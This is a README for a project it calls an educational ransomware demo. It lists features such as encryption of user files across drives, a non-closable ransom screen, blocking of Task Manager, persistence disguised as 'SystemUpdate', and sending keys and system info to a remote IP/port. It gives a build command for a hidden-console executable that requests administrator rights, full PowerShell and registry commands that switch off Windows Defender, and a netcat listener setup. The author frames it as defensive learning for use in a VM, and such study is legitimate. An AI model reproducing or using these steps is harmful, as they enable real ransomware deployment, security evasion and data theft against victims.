# windi_ransomware

![[photo.png]]

# Educational Ransomware Demo

> **WARNING:** This project is for **educational purposes only**.  
> It is designed to be tested **only in an isolated virtual machine** (e.g., VirtualBox, VMware).  
> Running this on a real system is illegal and extremely harmful.  
> The author assumes no responsibility for misuse.

---

## Overview

This is a simulated ransomware payload developed for learning and defensive research.  
It encrypts files on the target system using AES, displays a WannaCry-style ransom note,  
sends encryption keys and system info to a remote server, and automatically decrypts files after a countdown.

---

## Features

- Full disk encryption of user files (excluding critical system files)
- Professional WannaCry-like GUI (fullscreen, non-closable)
- Blocks Task Manager, Ctrl+Alt+Del, and window close actions
- Persistence: re-runs after reboot via Startup folder and Registry
- Sends system information and encryption key to a specified IP/port
- Automatic decryption after timer expires (default: 24 hours)
- Hardcoded key (`apple77777777`) for simplicity (not secure)
- Supports testing with short timer (e.g., 10 seconds)

---

## Disclaimer

This software is **not** a real ransomware. It does not use strong encryption,  
does not connect to cryptocurrency wallets, and is intended solely for learning  
how ransomware works and how to defend against it.

**Do NOT run this on any system you do not own or have explicit permission to test.**

---

## Requirements

- **Python 3.8+** (if running from source)
- **Windows 10/11** (or a Windows VM)
- Internet connection (for downloading dependencies)

### Python Libraries

```bash
pip install cryptography pyinstaller
```

---

## Configuration

Open the Python script and modify the following variables at the top:

```python
SERVER_IP = "192.168.1.100"    # Your IP address for receiving info
SERVER_PORT = 4444             # Port to send data to
KEY = b"apple77777777"         # Encryption key (not shown in UI)
TIMER_HOURS = 24               # Countdown hours
TIMER_MINUTES = 0
TIMER_SECONDS = 0
```

For quick testing, set `TIMER_HOURS = 0`, `TIMER_MINUTES = 0`, `TIMER_SECONDS = 10`.

---

## Building to Executable

1. Save the script as `ransomware_demo.py`.
2. Open command prompt (as administrator) in the script's directory.
3. Run:

```bash
pyinstaller --onefile --noconsole --uac-admin --hidden-import cryptography ransomware_demo.py
```

4. The executable will be in `dist/ransomware_demo.exe`.

---

## Testing in a Virtual Machine

### Step 1: Create a VM

- Install Windows 10/11 in VirtualBox or VMware.
- Take a snapshot before running the malware.

### Step 2: Disable Windows Defender (inside VM)

To prevent Windows Defender from blocking the demo, do the following:

#### Method 1: PowerShell (Administrator)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableRemovableDriveScanning $true
Set-MpPreference -DisableArchiveScanning $true
```

#### Method 2: Registry (Administrator PowerShell)

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
```

Restart the VM after applying.

#### Method 3: Windows Security UI

1. Go to **Settings → Update & Security → Windows Security → Virus & threat protection**.
2. Click **Manage settings**.
3. Turn off **Real-time protection**, **Cloud-delivered protection**, **Automatic sample submission**.
4. Scroll down and turn off **Tamper Protection** (required for other changes to stick).

### Step 3: Set Up Listener (Host Machine)

On your host (or another VM), start a netcat listener to receive data:

```bash
nc -lvnp 4444
```

Make sure the IP address in the script matches your host's IP within the VM network.

### Step 4: Transfer and Run the EXE

- Transfer the built EXE to the VM (shared folder, ISO, or download).
- Run it **as administrator** inside the VM.

You will see:

- Fullscreen red/black ransom note
- Countdown timer
- Files being encrypted
- Data sent to your listener

### Step 5: Observe and Clean Up

After the timer expires, files will be decrypted automatically and the program will exit.  
To restore the VM to a clean state, simply revert to the earlier snapshot.

If you didn't take a snapshot, manually:

- Re-enable Windows Defender (reverse the PowerShell commands)
- Remove startup entries:
  - Delete `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\system_update.exe`
  - Remove registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `SystemUpdate`
- Decrypt any remaining `.locked` files (you can write a small script using the same key/IV)

---

## Important Notes

- The encryption is **not** secure: the key and IV are hardcoded, and the IV is static.
- The code skips files with critical extensions to avoid breaking the operating system.
- The program attempts to encrypt all user files on all drives; on Windows, permission errors are silently ignored.
- The GUI cannot be closed (Alt+F4 disabled, Task Manager blocked), so only the timer can end the program.
- The program adds itself to startup and will run again after reboot.

---

## Legal Use

Use this software only in environments you own and control.  
Unauthorized access or damage to computer systems is a criminal offense in most jurisdictions.  
By using this code, you agree to use it solely for educational and defensive security research.

---

## Author

Created for learning purposes.  
Created by agrresore
